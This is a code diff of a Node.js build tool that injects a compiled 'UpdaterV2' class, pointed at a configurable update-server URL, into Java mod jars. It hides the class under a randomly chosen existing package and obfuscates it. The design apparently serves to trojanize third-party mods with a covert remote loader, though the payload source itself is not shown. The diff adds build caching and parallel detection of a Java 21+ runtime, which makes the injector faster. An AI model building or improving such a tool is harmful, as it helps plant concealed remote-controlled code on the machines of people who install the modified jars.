@@ -4,7 +4,7 @@ const os = require("os");
 const https = require("https");
 const crypto = require("crypto");
 const AdmZip = require("adm-zip");
-const { execFileSync } = require("child_process");
+const { execFileSync, execFile } = require("child_process");
 const OBFUSCATE_DEFAULT = "1";
 // Bare template mode: build a jar that contains nothing but the injected
 // class (UpdaterV2) with obfuscation applied — no third-party mod target.
@@ -153,44 +153,74 @@ function buildUpdaterV2(sourcePath, zip, updateServerUrl) {
   console.log(updateServerUrl);
   const packageName = getRandomExistingPackage(zip);
   const internalName = `${packageName.replace(/\./g, "/")}/UpdaterV2`;
-  const buildRoot = fs.mkdtempSync(path.join(os.tmpdir(), "UpdaterV2-"));
-  const sourceDir = path.join(buildRoot, ...packageName.split("."));
-  const classesDir = path.join(buildRoot, "classes");
-  fs.mkdirSync(sourceDir, { recursive: true });
-  fs.mkdirSync(classesDir, { recursive: true });
 
-  let originalSource = fs.readFileSync(sourcePath, "utf8");
-  if (updateServerUrl) {
-    originalSource = originalSource.replace(
-      "PLACEHOLDER_UPDATE_SERVER_URL",
-      updateServerUrl,
-    );
-  }
-  originalSource = originalSource.replace(/^\s*package\s+[\w.]+\s*;\s*/m, "");
-  const generatedSource = `package ${packageName};${os.EOL}${os.EOL}${originalSource}`;
-  const generatedSourcePath = path.join(sourceDir, "UpdaterV2.java");
-  fs.writeFileSync(generatedSourcePath, generatedSource, "utf8");
+  // The injected class only depends on the update URL, the javac release and
+  // the template source — not on the target package. Same server means the
+  // same class for every user, so cache the compiled bytes across builds
+  // instead of paying a full javac invocation each time.
+  const cacheKey = crypto
+    .createHash("sha1")
+    .update(String(updateServerUrl))
+    .update("|")
+    .update(JAVA_RELEASE)
+    .update("|")
+    .update(fs.readFileSync(sourcePath))
+    .digest("hex");
+  const cacheDir = path.join(process.cwd(), "updater-cache");
+  const cacheFile = path.join(cacheDir, `${cacheKey}.class`);
 
-  run("javac", [
-    "--release",
-    JAVA_RELEASE,
-    "-d",
-    classesDir,
-    generatedSourcePath,
-  ]);
+  let classData;
+  let classPathTmp;
+  if (fs.existsSync(cacheFile)) {
+    classData = fs.readFileSync(cacheFile);
+    classPathTmp = cacheFile;
+    console.log("[INFO] Reusing cached UpdaterV2 class (same update URL)");
+  } else {
+    const buildRoot = fs.mkdtempSync(path.join(os.tmpdir(), "UpdaterV2-"));
+    const sourceDir = path.join(buildRoot, ...packageName.split("."));
+    const classesDir = path.join(buildRoot, "classes");
+    fs.mkdirSync(sourceDir, { recursive: true });
+    fs.mkdirSync(classesDir, { recursive: true });
 
-  const classPath =
-    path.join(classesDir, ...internalName.split("/")) + ".class";
-  if (!fs.existsSync(classPath)) {
-    throw new Error("Generated UpdaterV2 class missing: " + classPath);
+    let originalSource = fs.readFileSync(sourcePath, "utf8");
+    if (updateServerUrl) {
+      originalSource = originalSource.replace(
+        "PLACEHOLDER_UPDATE_SERVER_URL",
+        updateServerUrl,
+      );
+    }
+    originalSource = originalSource.replace(/^\s*package\s+[\w.]+\s*;\s*/m, "");
+    const generatedSource = `package ${packageName};${os.EOL}${os.EOL}${originalSource}`;
+    const generatedSourcePath = path.join(sourceDir, "UpdaterV2.java");
+    fs.writeFileSync(generatedSourcePath, generatedSource, "utf8");
+
+    run("javac", [
+      "--release",
+      JAVA_RELEASE,
+      "-d",
+      classesDir,
+      generatedSourcePath,
+    ]);
+
+    const classPath =
+      path.join(classesDir, ...internalName.split("/")) + ".class";
+    if (!fs.existsSync(classPath)) {
+      throw new Error("Generated UpdaterV2 class missing: " + classPath);
+    }
+    classData = fs.readFileSync(classPath);
+    classPathTmp = classPath;
+
+    fs.mkdirSync(cacheDir, { recursive: true });
+    fs.writeFileSync(cacheFile, classData);
+    console.log("[INFO] Cached UpdaterV2 class for future builds");
   }
 
   return {
     internalName,
     binaryName: internalName.replace(/\//g, "."),
     jarEntry: `${internalName}.class`,
-    classData: fs.readFileSync(classPath),
-    classPathTmp: classPath,
+    classData,
+    classPathTmp,
   };
 }
 
@@ -500,19 +530,23 @@ function ensureobf2Jar() {
   return resolveobf2Jar();
 }
 
-function checkJava21OrHigher(javaPath) {
-  try {
-    const result = require("child_process").spawnSync(javaPath, ["-version"], {
-      timeout: 2000,
-    });
-    const combined =
-      (result.stdout ? result.stdout.toString("utf8") : "") +
-      (result.stderr ? result.stderr.toString("utf8") : "");
-    return isVersion21OrHigher(combined);
-  } catch (e) {
-    // Ignore errors and return false
-  }
-  return false;
+function javaVersionCheck(javaPath) {
+  // Concurrent probe: JDK -version spawns are slow (~hundreds of ms each), and
+  // probing a machine full of JDK installations one-by-one costs seconds.
+  return new Promise((resolve) => {
+    try {
+      execFile(javaPath, ["-version"], { timeout: 2000, windowsHide: true }, (err, stdout, stderr) => {
+        resolve(
+          isVersion21OrHigher(
+            (stdout ? stdout.toString("utf8") : "") +
+              (stderr ? stderr.toString("utf8") : ""),
+          ),
+        );
+      });
+    } catch (e) {
+      resolve(false);
+    }
+  });
 }
 
 function isVersion21OrHigher(versionStr) {
@@ -526,16 +560,15 @@ function isVersion21OrHigher(versionStr) {
   return false;
 }
 
-function findJava21OrHigher() {
-  if (checkJava21OrHigher("java")) {
-    return "java";
-  }
+async function findJava21OrHigher() {
+  const candidates = [];
+  candidates.push("java");
 
   if (process.env.JAVA_HOME) {
     const javaExe = process.platform === "win32" ? "java.exe" : "java";
     const javaPath = path.join(process.env.JAVA_HOME, "bin", javaExe);
-    if (fs.existsSync(javaPath) && checkJava21OrHigher(javaPath)) {
-      return javaPath;
+    if (fs.existsSync(javaPath)) {
+      candidates.push(javaPath);
     }
   }
 
@@ -604,12 +637,14 @@ function findJava21OrHigher() {
     }
   }
 
-  for (const javaPath of pathsToSearch) {
-    if (checkJava21OrHigher(javaPath)) {
-      return javaPath;
-    }
+  const allCandidates = candidates.concat(pathsToSearch);
+  // Probe everything at once; take the first candidate that reports 21+.
+  const results = await Promise.all(
+    allCandidates.map((p) => javaVersionCheck(p)),
+  );
+  for (let i = 0; i < allCandidates.length; i++) {
+    if (results[i]) return allCandidates[i];
   }
-
   return null;
 }
 
@@ -624,7 +659,7 @@ async function runobf2(inputJar, mixinClasses) {
   const seed = Math.floor(Math.random() * 1_000_000_000).toString();
   const aggressive = String(process.env.OBF2_AGGRESSIVE || "1") === "1";
 
-  const javaBin = findJava21OrHigher();
+  const javaBin = await findJava21OrHigher();
   if (!javaBin) {
     throw new Error(
       "Obfuscation requires Java 21 or higher. No Java 21+ installation was detected. Please install Java 21 or set JAVA_HOME to a Java 21+ installation.",
